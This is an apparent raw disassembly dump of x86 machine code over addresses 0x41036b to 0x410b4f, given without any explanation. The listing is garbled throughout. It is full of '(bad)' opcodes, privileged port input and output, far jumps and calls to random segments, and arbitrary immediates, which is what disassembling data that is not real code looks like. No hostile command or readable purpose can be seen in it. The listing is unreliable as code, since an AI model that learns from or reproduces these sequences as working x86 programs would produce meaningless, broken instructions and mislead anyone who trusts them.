  41036b:	mov    DWORD PTR [ebp+0x46],esp
  41036e:	mov    ds:0x6722003f,al
  410373:	mov    ebp,0xa55dc56
  410378:	jle    0x410310
  41037a:	sub    dl,BYTE PTR [edx-0x6d]
  41037d:	mov    ds:0xabc461f2,eax
  410382:	retf   
  410383:	mov    al,ds:0x674e2226
  410388:	jge    0x41035f
  41038a:	repz (bad) 
  41038d:	xchg   ebp,eax
  41038e:	aam    0x44
  410390:	cdq    
  410391:	dec    edi
  410392:	in     al,0xb3
  410394:	arpl   sp,si
  410396:	jl     0x410370
  410398:	sahf   
  410399:	and    al,0x40
  41039b:	stos   BYTE PTR es:[edi],al
  41039c:	xor    ebp,esp
  41039e:	shr    DWORD PTR [edi-0x27],1
  4103a1:	xlat   BYTE PTR ds:[ebx]
  4103a2:	retf   
  4103a3:	push   cs
  4103a4:	les    esp,FWORD PTR [eax-0x6d]
  4103a7:	or     al,BYTE PTR [esi-0x188ae4a0]
  4103ad:	int    0x69
  4103af:	dec    edi
  4103b0:	add    eax,DWORD PTR [esi+0x32]
  4103b3:	aam    0x4
  4103b5:	rcl    BYTE PTR [edi-0x2905dc2b],0xf9
  4103bc:	adc    DWORD PTR [edi],0xfffffff3
  4103bf:	in     eax,0xe6
  4103c1:	std    
  4103c2:	adc    al,0x1e
  4103c4:	imul   esp,DWORD PTR [eax-0x7f],0xffffffbe
  4103c8:	and    eax,0xe81a6ebf
  4103cd:	sub    eax,0x969ac487
  4103d2:	inc    esp
  4103d3:	retf   0x1212
  4103d6:	xchg   edx,eax
  4103d7:	cmp    ah,bh
  4103d9:	add    eax,0xe85e5693
  4103de:	das    
  4103df:	lds    edi,FWORD PTR [ebx+0x1b7829f4]
  4103e5:	or     DWORD PTR [esi],esp
  4103e7:	xchg   edi,eax
  4103e8:	and    al,0xd5
  4103ea:	adc    al,0x1e
  4103ec:	adc    al,0x64
  4103ee:	xchg   esp,eax
  4103ef:	into   
  4103f0:	mov    eax,ds:0x8aa5ada8
  4103f5:	mov    edx,0xea196f2c
  4103fa:	push   ebp
  4103fb:	inc    ebx
  4103fc:	jo     0x4103be
  4103fe:	jl     0x41044d
  410400:	ror    DWORD PTR [esi+0x71],0x28
  410404:	cmp    al,0xb2
  410406:	adc    edx,DWORD PTR [esi]
  410408:	mov    dl,0x56
  41040a:	aad    0xaa
  41040c:	(bad)
  410410:	adc    ch,bh
  410412:	pop    esi
  410413:	sahf   
  410414:	aam    0xd4
  410416:	adc    eax,0x18876553
  41041b:	inc    esi
  41041c:	inc    ebx
  41041d:	cwde   
  41041e:	xlat   BYTE PTR ds:[ebx]
  41041f:	test   BYTE PTR [esp+esi*8-0x605ffb07],cl
  410426:	mov    bh,0x43
  410428:	dec    eax
  410429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41042a:	inc    edx
  41042b:	or     dl,BYTE PTR [ecx+ebx*8-0x197f10]
  410432:	lds    esp,FWORD PTR [ecx-0xf]
  410435:	inc    edi
  410436:	les    eax,FWORD PTR [ecx+0x26089c5d]
  41043c:	push   edx
  41043d:	rcr    BYTE PTR [esp+ebx*8-0x1b],cl
  410441:	mov    ch,0x84
  410443:	inc    edx
  410444:	test   eax,0xbf02bd06
  410449:	into   
  41044a:	loop   0x41041b
  41044c:	int    0x8f
  41044e:	jns    0x41045f
  410450:	shl    BYTE PTR [ecx+0x1],1
  410453:	xchg   edx,eax
  410454:	push   edx
  410455:	pop    es
  410456:	adc    BYTE PTR [edx+0x2a9b2cd2],ch
  41045c:	dec    edi
  41045d:	mov    al,0xd1
  41045f:	adc    DWORD PTR [ecx+ebp*1+0x75790b2d],esi
  410466:	rcr    DWORD PTR [ecx],0x31
  410469:	xchg   ebx,eax
  41046a:	lods   eax,DWORD PTR ds:[esi]
  41046b:	jmp    0x5cbd6d16
  410470:	xchg   ebp,eax
  410471:	nop
  410472:	adc    eax,0xe4f22cba
  410477:	dec    esp
  410478:	test   eax,0x4442f48e
  41047d:	add    cl,ah
  41047f:	push   edi
  410480:	mov    ah,0x56
  410482:	mov    bh,0xe3
  410484:	jp     0x410409
  410486:	inc    BYTE PTR [edi]
  410488:	pop    ecx
  410489:	cmp    edx,ebx
  41048b:	jnp    0x4104a9
  41048d:	push   ebp
  41048e:	cmp    eax,0xe0fdbd84
  410493:	pop    eax
  410494:	dec    ebx
  410495:	(bad)  
  410496:	lahf   
  410497:	inc    edx
  410498:	sbb    cl,dh
  41049a:	adc    al,0x3d
  41049c:	(bad)  
  41049e:	pop    ebp
  41049f:	push   edi
  4104a0:	mov    ebp,0x26a8ef80
  4104a6:	inc    ebp
  4104a7:	(bad)  
  4104a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a9:	fxch   st(5)
  4104ab:	or     ecx,ecx
  4104ad:	lea    ebx,[edi+0x769e5ea9]
  4104b3:	xor    eax,0xf6a91d1e
  4104b8:	mov    ebx,gs
  4104ba:	cmp    ah,ah
  4104bc:	jae    0x4104a8
  4104be:	push   edx
  4104bf:	sub    dl,BYTE PTR [edi+0x5b]
  4104c2:	xlat   BYTE PTR ds:[ebx]
  4104c3:	mov    eax,ds:0x92670c33
  4104c8:	addr16 mov dl,0x8a
  4104cb:	lock mov al,ds:0x505bba5d
  4104d1:	sbb    bl,BYTE PTR [ebp+0x4150235c]
  4104d7:	mov    al,0x68
  4104d9:	popf   
  4104da:	cmp    BYTE PTR [esi+0xd],0x64
  4104de:	je     0x41052e
  4104e0:	(bad)  
  4104e1:	test   eax,0x97021987
  4104e6:	popa   
  4104e7:	and    DWORD PTR [ecx],esp
  4104e9:	hlt    
  4104ea:	loop   0x410531
  4104ec:	nop
  4104ed:	int    0xb5
  4104ef:	std    
  4104f0:	bound  edi,QWORD PTR [ebp+0xa399aef]
  4104f6:	jmp    0x410525
  4104f8:	push   0x1fe7ef6b
  4104fd:	(bad)  
  4104ff:	and    eax,0x250ba86c
  410504:	adc    ebx,0xffffffc7
  410507:	push   esi
  410508:	mov    bl,0x85
  41050a:	mov    ebx,0x4e5a59a9
  41050f:	sahf   
  410510:	pop    ecx
  410511:	clc    
  410512:	xchg   edi,eax
  410513:	inc    edi
  410514:	ins    DWORD PTR es:[edi],dx
  410515:	xor    DWORD PTR [eax],0x6220171
  41051b:	js     0x41052d
  41051d:	jb     0x410523
  41051f:	cmp    DWORD PTR [ebx-0x64fde844],ecx
  410525:	test   esp,ebx
  410527:	scas   eax,DWORD PTR es:[edi]
  410528:	popf   
  410529:	add    BYTE PTR [edx+eiz*2],0x8c
  41052d:	gs pop esp
  41052f:	out    0xb0,al
  410531:	push   esi
  410533:	call   0xd0ad:0x3c696097
  41053a:	lds    esp,FWORD PTR [ebx-0x9]
  41053d:	clc    
  41053e:	push   ebx
  41053f:	je     0x41052f
  410541:	out    0x73,al
  410543:	jns    0x410581
  410545:	in     eax,dx
  410546:	mov    dh,0xcc
  410548:	mov    al,dh
  41054a:	jmp    0x118:0x92731cbe
  410551:	sahf   
  410552:	push   0x48
  410554:	or     edi,DWORD PTR [esi-0x561053f4]
  41055a:	aas    
  41055b:	lds    edi,FWORD PTR [esi-0x59]
  41055e:	add    DWORD PTR [ecx-0x19],0xb07e9a12
  410565:	cmp    eax,0x67e2594f
  41056a:	bound  esi,QWORD PTR [ebp+0x26]
  41056d:	std    
  41056e:	fcmovnbe st,st(7)
  410570:	dec    esp
  410571:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410573:	xchg   esp,eax
  410574:	pop    ds
  410575:	mov    bl,0x1b
  410577:	dec    ecx
  410578:	fdiv   QWORD PTR [edi+0xeea3d6]
  41057e:	std    
  41057f:	sbb    al,0xb6
  410581:	and    BYTE PTR [esi],al
  410583:	lods   eax,DWORD PTR ds:[esi]
  410584:	mov    esp,0xb5e2e312
  410589:	pop    edx
  41058a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41058b:	ss mov dl,0x0
  41058e:	repz cmp dl,BYTE PTR [edi]
  410591:	jnp    0x410587
  410593:	dec    edx
  410594:	fild   DWORD PTR [edx-0x277374fb]
  41059a:	push   esp
  41059b:	sar    BYTE PTR [eax-0x11f22263],cl
  4105a1:	cmp    DWORD PTR ds:0x3a984df1,0xe75144fd
  4105ab:	jmp    0xa4be:0x6baa30ec
  4105b2:	and    al,0x1a
  4105b4:	lods   eax,DWORD PTR ds:[esi]
  4105b5:	cmp    DWORD PTR [ebx+0xd5f525d],eax
  4105bb:	(bad)  
  4105bc:	popa   
  4105bd:	sahf   
  4105be:	jmp    0x4105e7
  4105c0:	mov    bl,0x61
  4105c2:	xor    BYTE PTR [ecx*4+0x3316b55b],bh
  4105c9:	mov    al,0x53
  4105cb:	jl     0x410628
  4105cd:	and    ah,BYTE PTR [ebx]
  4105cf:	les    ebx,FWORD PTR [eax+0x7ef5a3b8]
  4105d5:	ins    DWORD PTR es:[edi],dx
  4105d6:	xchg   ecx,eax
  4105d7:	inc    ecx
  4105d8:	pop    ebx
  4105d9:	rcr    BYTE PTR [edi],0x4
  4105dc:	jns    0x4105eb
  4105de:	popa   
  4105df:	mov    ecx,ebp
  4105e1:	fstp   TBYTE PTR gs:[eax+0x67]
  4105e5:	dec    ebp
  4105e6:	jecxz  0x41060f
  4105e8:	cmp    al,ah
  4105ea:	mov    al,ds:0x6c3fe621
  4105ef:	cwde   
  4105f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105f1:	lahf   
  4105f2:	jmp    0x410633
  4105f4:	mov    bh,cl
  4105f6:	adc    esi,DWORD PTR [ebp+0x5dfb70a8]
  4105fc:	xchg   esp,eax
  4105fd:	in     al,dx
  4105fe:	pop    ss
  4105ff:	(bad)  
  410601:	mov    dh,al
  410603:	mov    dl,ch
  410605:	or     BYTE PTR [edi-0x34],0xf5
  410609:	and    al,0x24
  41060b:	sub    DWORD PTR [esi+0x2],esp
  41060e:	out    0xcf,eax
  410610:	out    0x33,al
  410612:	and    dh,al
  410614:	jmp    0xbbf4a964
  410619:	or     al,0x73
  41061b:	rcr    DWORD PTR [ebx+ecx*1],1
  41061e:	jne    0x41060d
  410620:	sub    dl,BYTE PTR [ecx-0x1c30a2a4]
  410626:	fistp  WORD PTR [edx]
  410628:	in     eax,dx
  410629:	mov    bl,0x9c
  41062b:	sbb    edx,ebx
  41062d:	(bad)  
  41062e:	cmp    bh,BYTE PTR ds:0x83f6809f
  410634:	stos   DWORD PTR es:[edi],eax
  410635:	sub    ah,dh
  410637:	push   ds
  410638:	loope  0x410622
  41063a:	inc    DWORD PTR [edi]
  41063c:	js     0x4105d6
  41063e:	sub    DWORD PTR [esi-0x8],edi
  410641:	popf   
  410642:	(bad)  
  410643:	cmc    
  410644:	test   eax,0xa27891e7
  410649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41064a:	sub    DWORD PTR [eax+ecx*4-0x14],ebx
  41064e:	mov    BYTE PTR [edi+edx*4-0x9fb88a5],al
  410655:	stc    
  410656:	popf   
  410657:	fwait
  410658:	mov    esp,0x9a96e858
  41065d:	inc    ebx
  41065e:	nop
  41065f:	xor    BYTE PTR [esi],dl
  410661:	sub    eax,0xbfa902eb
  410666:	mov    bh,0x69
  410668:	adc    al,BYTE PTR [ebx+ecx*4]
  41066b:	out    dx,al
  41066c:	mov    esi,0xb48cb13d
  410672:	xor    al,0x38
  410674:	jmp    0x6335:0xa6ad5983
  41067b:	or     eax,0xf2325c67
  410680:	push   esi
  410681:	push   cs
  410682:	pop    ebx
  410683:	pop    es
  410684:	addr16 daa 
  410686:	imul   esi,DWORD PTR [eax+0x7ad7690d],0xffffffc7
  41068d:	jo     0x41062e
  41068f:	pop    ss
  410690:	ins    BYTE PTR es:[edi],dx
  410691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410692:	popa   
  410693:	pusha  
  410694:	add    DWORD PTR [edi+0x3c],edi
  410697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410698:	fnstenv [ebx-0x750e98bc]
  41069e:	lock pop ebx
  4106a0:	adc    esp,DWORD PTR [esi-0x5a]
  4106a3:	add    edx,DWORD PTR [esi]
  4106a5:	mov    ebp,0x83c57d82
  4106aa:	loop   0x410634
  4106ac:	mov    esp,DWORD PTR fs:[ebp+0x5]
  4106b0:	(bad)  
  4106b1:	pop    ds
  4106b2:	fs xor eax,0x9f17236e
  4106b8:	push   cs
  4106b9:	ror    eax,cl
  4106bb:	retf   0x64d
  4106be:	icebp  
  4106bf:	push   0xffffffa1
  4106c1:	jge    0x41069b
  4106c3:	push   edx
  4106c4:	mov    eax,0x81d33932
  4106c9:	and    al,0xa
  4106cb:	fst    st(0)
  4106cd:	xlat   BYTE PTR ds:[ebx]
  4106ce:	js     0x41070c
  4106d0:	stos   BYTE PTR es:[edi],al
  4106d1:	push   esp
  4106d2:	mov    dh,BYTE PTR [esi+0x71]
  4106d5:	push   esp
  4106d6:	or     esp,eax
  4106d8:	aad    0xed
  4106da:	jp     0x4106c1
  4106dc:	aam    0x71
  4106de:	test   eax,0x4c73cf81
  4106e3:	in     eax,dx
  4106e4:	(bad)  
  4106e5:	std    
  4106e6:	les    esi,FWORD PTR [eax-0x34ffb2cc]
  4106ec:	pop    esi
  4106ed:	or     al,0x94
  4106ef:	icebp  
  4106f0:	aaa    
  4106f1:	sbb    BYTE PTR [ebp-0x48],0xfc
  4106f5:	add    BYTE PTR [ebp-0x738e19d1],al
  4106fb:	call   0x4f0e:0x97d4c5c7
  410702:	mov    ah,BYTE PTR [ecx+0x272bf1a5]
  410708:	push   esi
  410709:	xlat   BYTE PTR ds:[ebx]
  41070a:	bound  eax,QWORD PTR [esi+eax*8+0x7e]
  41070e:	cmp    al,0x95
  410710:	lds    edx,FWORD PTR es:[edi+0x1b6d5d63]
  410717:	lods   eax,DWORD PTR ds:[esi]
  410718:	sbb    cl,BYTE PTR [edx]
  41071a:	fdiv   QWORD PTR [esi-0x7b]
  41071d:	dec    dx
  41071f:	dec    esi
  410720:	lea    ecx,[ecx-0x6d3de41]
  410726:	sbb    ah,BYTE PTR ds:0x81de1a57
  41072c:	sub    eax,0x61d0a3db
  410731:	scas   eax,DWORD PTR es:[edi]
  410732:	mov    cl,0xe
  410734:	sbb    al,0xb6
  410736:	cmc    
  410737:	(bad)  
  410738:	push   ss
  410739:	mov    ebp,0xe770e094
  41073e:	retf   0x9b28
  410741:	arpl   WORD PTR [edi+0x58],sp
  410744:	pop    edi
  410745:	test   DWORD PTR [esi],ebp
  410747:	xchg   ebx,eax
  410748:	repnz int 0x25
  41074b:	jns    0x410792
  41074d:	fldcw  WORD PTR ds:0x1f2f40f4
  410753:	mov    edx,0x15fa8598
  410758:	pop    es
  410759:	lahf   
  41075a:	cwde   
  41075b:	xsave  ds:0xbcbed08d
  410762:	test   al,0xa5
  410764:	xchg   ecx,eax
  410765:	mov    esp,DWORD PTR [ecx-0x4a]
  410768:	std    
  410769:	rcr    DWORD PTR [edx+0x2c32fe0c],0xa6
  410770:	cs pusha 
  410772:	add    al,0xed
  410774:	retf   
  410775:	imul   ecx,DWORD PTR [esi],0xffffff9e
  410778:	or     dl,dh
  41077a:	adc    DWORD PTR [ebx+ebx*1],esi
  41077d:	mov    WORD PTR [ebx+0x3c],sp
  410781:	scas   al,BYTE PTR es:[edi]
  410782:	arpl   WORD PTR [ebp-0x4e],ax
  410785:	lahf   
  410786:	call   0x8162455c
  41078b:	add    eax,0x672c600f
  410790:	ficomp WORD PTR ds:0x19266eb9
  410796:	pop    ebx
  410797:	add    eax,0xcdad44d9
  41079c:	and    ebx,DWORD PTR [ebx-0x634f5e54]
  4107a2:	mov    ebp,0xcb435a54
  4107a7:	stc    
  4107a8:	cli    
  4107a9:	lea    ebp,[ecx-0x79]
  4107ac:	sbb    al,0x7f
  4107ae:	mov    BYTE PTR [ebx+0x6101fffa],ah
  4107b4:	inc    ecx
  4107b5:	inc    esi
  4107b6:	ret    
  4107b7:	dec    ecx
  4107b8:	(bad)  
  4107b9:	cdq    
  4107ba:	cmp    al,0x73
  4107bc:	shr    dh,1
  4107be:	sbb    BYTE PTR [esi],dl
  4107c0:	sub    al,0x2c
  4107c2:	xchg   DWORD PTR [eax-0x42],esp
  4107c5:	pop    edx
  4107c6:	rol    DWORD PTR [ecx-0x53],0xc8
  4107ca:	jb     0x4107f1
  4107cc:	ds stos DWORD PTR es:[edi],eax
  4107ce:	and    DWORD PTR [ecx+0x54],0xfa7d1ad8
  4107d5:	dec    ebp
  4107d6:	or     ecx,DWORD PTR [ebx-0x59]
  4107d9:	sbb    al,0xb5
  4107db:	add    BYTE PTR [edi-0x74],bl
  4107de:	(bad)  
  4107df:	shr    BYTE PTR [edx-0x609697bc],cl
  4107e5:	aad    0xd2
  4107e7:	shl    DWORD PTR [ecx-0x3b077a85],cl
  4107ed:	out    dx,al
  4107ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ef:	push   cs
  4107f0:	nop
  4107f1:	push   ss
  4107f2:	push   ecx
  4107f3:	pusha  
  4107f4:	xor    DWORD PTR [esi-0x3324002e],ebx
  4107fa:	pop    edi
  4107fb:	push   ds
  4107fc:	mov    al,ds:0x82ce8fee
  410801:	loope  0x410820
  410803:	sar    BYTE PTR [eax+0x7a6ebb10],cl
  410809:	mov    edi,0x5295ed73
  41080e:	in     eax,0xed
  410810:	jge    0x4107c8
  410812:	or     eax,0xbcb0ebda
  410817:	and    bl,BYTE PTR [ebx+0x5b]
  41081a:	push   ds
  41081b:	and    ecx,edx
  41081d:	pop    edx
  41081e:	adc    ch,dl
  410820:	outs   dx,DWORD PTR ds:[esi]
  410821:	jae    0x41085b
  410823:	lahf   
  410824:	sar    bl,0x78
  410827:	jg     0x410872
  410829:	push   ss
  41082a:	out    dx,eax
  41082b:	jmp    0x41083d
  41082d:	mov    dh,0x22
  41082f:	ins    BYTE PTR es:[edi],dx
  410830:	jl     0x410879
  410832:	enter  0x2d47,0x47
  410836:	mov    bl,0x13
  410838:	sbb    edx,edx
  41083a:	push   esi
  41083b:	scas   al,BYTE PTR es:[edi]
  41083c:	sahf   
  41083d:	ret    0xfed8
  410840:	dec    BYTE PTR [ebx+0x2e]
  410843:	fwait
  410844:	fs stc 
  410846:	cwde   
  410847:	sbb    eax,DWORD PTR [esi+0x23]
  41084a:	leave  
  41084b:	fldenv [edx]
  41084d:	dec    edx
  41084e:	sahf   
  41084f:	inc    ebp
  410850:	mov    ebx,0x7f27f056
  410855:	sbb    BYTE PTR [ecx],dl
  410857:	push   ss
  410858:	(bad)  
  410859:	mov    esp,esi
  41085b:	dec    esp
  41085c:	add    DWORD PTR [esp+ebx*4-0x35],edx
  410860:	sbb    al,BYTE PTR [edx+0x14]
  410863:	or     al,0x11
  410865:	dec    edi
  410866:	call   0xb637:0x6d45b10
  41086d:	sbb    DWORD PTR [eax-0x57262b6c],0xec55f382
  410877:	(bad)  
  410878:	stc    
  410879:	push   es
  41087a:	pop    es
  41087b:	cmc    
  41087c:	and    eax,0xee5189c3
  410881:	setno  BYTE PTR [edx-0x4a]
  410885:	aaa    
  410886:	xor    bl,bl
  410888:	jg     0x4108d3
  41088a:	or     DWORD PTR [eax-0x33b5e586],esp
  410890:	sbb    DWORD PTR [edx],esi
  410892:	pop    ebp
  410893:	jl     0x41089e
  410895:	sbb    ecx,0xded3d47c
  41089b:	pop    esp
  41089c:	(bad)
  41089f:	nop
  4108a0:	or     ah,0xa8
  4108a3:	gs cmc 
  4108a5:	cdq    
  4108a6:	cmp    eax,0x3d609d9c
  4108ab:	ret    0x3007
  4108ae:	jge    0x410923
  4108b0:	push   edx
  4108b1:	cld    
  4108b2:	shl    DWORD PTR [edi+ebp*1+0x3ca84a99],1
  4108b9:	sub    dl,BYTE PTR [esi+0x299b2712]
  4108bf:	fbld   TBYTE PTR [esi]
  4108c1:	dec    esp
  4108c2:	int3   
  4108c3:	push   es
  4108c4:	cmp    al,0x44
  4108c6:	cmp    DWORD PTR [ebx],0x465b4466
  4108cc:	rcr    DWORD PTR [edi+0x671383cd],cl
  4108d2:	stos   DWORD PTR es:[edi],eax
  4108d3:	pop    ecx
  4108d4:	inc    ecx
  4108d5:	neg    esp
  4108d7:	mov    edx,0xc5f14ee9
  4108dc:	push   ecx
  4108dd:	sbb    eax,edx
  4108df:	jp     0x410946
  4108e1:	xor    al,0xda
  4108e3:	(bad)  
  4108e5:	data16 loop 0x41086d
  4108e8:	stc    
  4108e9:	mov    ds:0xc974b48d,eax
  4108ee:	inc    edx
  4108ef:	scas   al,BYTE PTR es:[edi]
  4108f0:	out    dx,eax
  4108f1:	repz jb 0x41096a
  4108f4:	lods   al,BYTE PTR ds:[esi]
  4108f5:	jmp    0xd089216f
  4108fa:	dec    eax
  4108fb:	out    0x4,eax
  4108fd:	cli    
  4108fe:	out    0x19,eax
  410900:	pop    edi
  410901:	hlt    
  410902:	push   0xc18f3679
  410907:	aas    
  410908:	nop
  410909:	ret    0x97b4
  41090c:	repnz mov ebp,0xbefc29a5
  410912:	adc    edx,DWORD PTR [ebp-0x170e95e8]
  410918:	mov    ds:0xc57b2a1a,eax
  41091d:	outs   dx,BYTE PTR ds:[esi]
  41091e:	pop    ebp
  41091f:	jne    0x410961
  410921:	mov    cl,0x28
  410923:	xchg   esi,eax
  410924:	les    eax,FWORD PTR cs:[ebx]
  410927:	imul   BYTE PTR [ecx-0x26e7bd38]
  41092d:	fs mov ecx,0x44266ca6
  410933:	mov    ch,0xeb
  410935:	mov    bl,0xc2
  410937:	xchg   ecx,eax
  410938:	arpl   bp,di
  41093a:	sbb    BYTE PTR [ebx+ebp*8],0xe7
  41093e:	inc    edi
  41093f:	gs pusha 
  410941:	cmp    dl,BYTE PTR [edi-0x3676814f]
  410947:	mov    cl,0x21
  410949:	add    BYTE PTR [edi+0x34],dl
  41094c:	cmp    BYTE PTR [ebp-0x3d],dh
  41094f:	sar    BYTE PTR [esi],cl
  410951:	xor    eax,0x84c67193
  410956:	sbb    DWORD PTR [ebp-0x39],eax
  410959:	mov    bl,0x5d
  41095b:	mov    esi,0x5c5ab1e9
  410960:	out    0x91,eax
  410962:	pop    ebx
  410963:	sub    esi,DWORD PTR [ebp+0x6c]
  410966:	xchg   edx,eax
  410967:	xor    ebp,edx
  410969:	push   edx
  41096a:	cdq    
  41096b:	sub    ecx,DWORD PTR [edx]
  41096d:	hlt    
  41096e:	in     al,0x3c
  410970:	test   BYTE PTR [edx],dl
  410972:	dec    ecx
  410973:	ss xchg ebp,eax
  410975:	xchg   edx,eax
  410976:	dec    esi
  410977:	push   cs
  410978:	add    ebp,DWORD PTR [edx+0x7b]
  41097b:	lea    esi,[esi]
  41097d:	xor    DWORD PTR [esp+ebx*4],edx
  410980:	sbb    BYTE PTR [ecx-0x59],0x7d
  410984:	and    dl,BYTE PTR [ebx+0x156234e]
  41098a:	add    DWORD PTR [ecx-0x72328ce4],0x24
  410991:	pop    edi
  410992:	not    DWORD PTR [ebx]
  410994:	loopne 0x4109db
  410996:	(bad)  
  410997:	fisub  WORD PTR [ecx-0x1d]
  41099a:	mov    bl,0xc1
  41099c:	ins    DWORD PTR es:[edi],dx
  41099d:	lods   eax,DWORD PTR ds:[esi]
  41099e:	add    eax,0x6ed7b549
  4109a3:	jmp    DWORD PTR [edx+0x29fe84f1]
  4109a9:	pop    ebp
  4109aa:	(bad)  
  4109ab:	cmc    
  4109ac:	mov    esi,0xe8900ed8
  4109b1:	imul   ecx,DWORD PTR [esi+0x2f],0x712098d
  4109b8:	mov    cl,0x3b
  4109ba:	jl     0x4109bf
  4109bc:	lods   al,BYTE PTR ds:[esi]
  4109bd:	pop    esp
  4109be:	sbb    al,0x4f
  4109c0:	sti    
  4109c1:	int3   
  4109c2:	cmp    al,0x81
  4109c4:	and    eax,0x6bb69b1
  4109c9:	jae    0x410a49
  4109cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109cc:	mov    esi,ebx
  4109ce:	xor    eax,DWORD PTR [ebp+esi*8+0x4a]
  4109d2:	int    0xf3
  4109d4:	ja     0x41096e
  4109d6:	push   0xb6f2c603
  4109db:	add    al,0x7b
  4109dd:	shl    BYTE PTR [esi-0x2ac1a4c5],0xf1
  4109e4:	sar    BYTE PTR [ebx-0x7195670c],0x3b
  4109eb:	rcr    BYTE PTR [ebx+0x78],1
  4109ee:	addr16 lock pop edi
  4109f1:	xor    dh,bh
  4109f3:	imul   ebp
  4109f5:	repz out 0xbe,al
  4109f8:	mov    bl,0x81
  4109fa:	inc    ecx
  4109fb:	cmp    BYTE PTR [edi],0x32
  4109fe:	jge    0x4109a4
  410a00:	adc    BYTE PTR [ebp+edi*2+0x4122d832],bl
  410a07:	into   
  410a08:	adc    ebp,DWORD PTR [eax-0x74d37ade]
  410a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a0f:	ror    DWORD PTR [edx],0x0
  410a12:	retf   0xce56
  410a15:	mov    ebx,0xeabdad0a
  410a1a:	fild   DWORD PTR [ebx+edi*1-0x5c291744]
  410a21:	scas   eax,DWORD PTR es:[edi]
  410a22:	sub    bh,cl
  410a24:	dec    edi
  410a25:	xchg   ecx,eax
  410a26:	xor    eax,0xf924822a
  410a2b:	outs   dx,BYTE PTR ds:[esi]
  410a2c:	out    0x43,eax
  410a2e:	fidiv  WORD PTR [ecx+0x56]
  410a31:	and    edi,DWORD PTR [ebx-0x69]
  410a34:	adc    ebx,DWORD PTR [ebx-0xfdda644]
  410a3a:	not    DWORD PTR [esi+0x50]
  410a3d:	fs push ss
  410a3f:	in     eax,dx
  410a40:	dec    BYTE PTR [edx]
  410a42:	xchg   DWORD PTR ds:0xaefd7d98,esp
  410a48:	adc    eax,0xdc843628
  410a4d:	jbe    0x410a5c
  410a4f:	dec    esi
  410a50:	push   0xffffffbb
  410a52:	hlt    
  410a53:	or     DWORD PTR ds:0x53a6a841,esp
  410a59:	test   al,0x46
  410a5b:	(bad)  
  410a5d:	ss pop edx
  410a5f:	mov    eax,ds:0x90cfb63d
  410a64:	bound  esi,QWORD PTR [ecx]
  410a66:	cmp    al,0xd8
  410a69:	(bad)  
  410a6a:	push   0x1e
  410a6c:	adc    BYTE PTR [ebp-0x3a],dl
  410a6f:	sbb    BYTE PTR [ecx],ah
  410a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a72:	mov    esp,0xc8fc27f7
  410a77:	pop    es
  410a78:	enter  0x3714,0xe6
  410a7c:	xor    BYTE PTR [edi],ch
  410a7e:	xchg   esi,eax
  410a7f:	mov    esi,DWORD PTR [edi-0x6f0eac6]
  410a85:	jbe    0x410a85
  410a87:	adc    dh,BYTE PTR [ebx+0x6ddc9551]
  410a8d:	or     DWORD PTR [eax-0x4ed06b36],ecx
  410a93:	and    al,0x11
  410a95:	mov    ah,BYTE PTR [edx]
  410a97:	sub    al,0xdf
  410a99:	gs inc edi
  410a9b:	inc    eax
  410a9c:	mov    bl,0x3
  410a9e:	cmp    DWORD PTR [ebp+0x17ba71ee],esp
  410aa4:	ins    DWORD PTR es:[edi],dx
  410aa5:	cmp    eax,0xd51f812f
  410aaa:	cwde   
  410aab:	shl    DWORD PTR [eax-0x74],cl
  410aae:	pop    ecx
  410aaf:	test   al,0x29
  410ab1:	jns    0x410afa
  410ab3:	xchg   ebp,eax
  410ab4:	inc    edi
  410ab5:	xchg   ebp,eax
  410ab6:	pop    esi
  410ab7:	fst    DWORD PTR [ecx]
  410ab9:	add    cl,ch
  410abb:	test   ebx,0x8caaacfb
  410ac1:	push   esi
  410ac2:	or     ebp,DWORD PTR [edi+0x75]
  410ac5:	inc    edi
  410ac6:	jbe    0x410a7a
  410ac8:	mov    ah,0x5f
  410aca:	fdivp  st(6),st
  410acc:	adc    esp,esp
  410ace:	aaa    
  410acf:	pop    edx
  410ad0:	add    dh,BYTE PTR [ecx]
  410ad2:	rol    edi,cl
  410ad4:	jg     0x410af7
  410ad6:	mov    ebx,0x4fdaa0b5
  410adb:	dec    ebp
  410adc:	jecxz  0x410af1
  410ade:	hlt    
  410adf:	aaa    
  410ae0:	leave  
  410ae1:	lods   eax,DWORD PTR ds:[esi]
  410ae2:	xchg   ebp,eax
  410ae3:	jecxz  0x410a67
  410ae5:	(bad)  
  410ae7:	(bad)  
  410ae8:	aam    0xc1
  410aea:	mov    ds:0xec702733,eax
  410aef:	inc    esp
  410af0:	je     0x410aa8
  410af2:	out    dx,al
  410af3:	sub    ecx,ebp
  410af5:	adc    eax,DWORD PTR [ebp+0x21]
  410af8:	loopne 0x410b50
  410afa:	push   eax
  410afb:	mov    al,ds:0xe81c93f6
  410b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b01:	push   ebp
  410b02:	test   BYTE PTR [esi+ebp*2-0x27],cl
  410b06:	ja     0x410b4d
  410b08:	push   ds
  410b09:	imul   ecx,esi,0xd7c56a6e
  410b0f:	add    dl,BYTE PTR [edx-0x5fc9f6e2]
  410b15:	xchg   esp,eax
  410b16:	dec    edi
  410b17:	pop    edx
  410b18:	test   eax,0x25f9a0ae
  410b1d:	push   ebx
  410b1e:	lock cmp BYTE PTR [eax],dh
  410b21:	call   0x149e:0x5b6c8edb
  410b28:	mov    ds:0x24b77a3e,al
  410b2d:	call   0xcaf0:0xf1c0b108
  410b34:	push   ebx
  410b35:	lea    ecx,[esi+0x60]
  410b38:	daa    
  410b39:	mov    edi,0xed69b437
  410b3e:	mov    ds:0x5bcc9a2a,al
  410b43:	pop    ecx
  410b44:	data16 adc ah,BYTE PTR [ebx]
  410b47:	lock fcom st(0)
  410b4a:	ds xchg edi,eax
  410b4c:	test   al,0x60
  410b4e:	pop    ebx
  410b4f:	mov    bl,0xd7
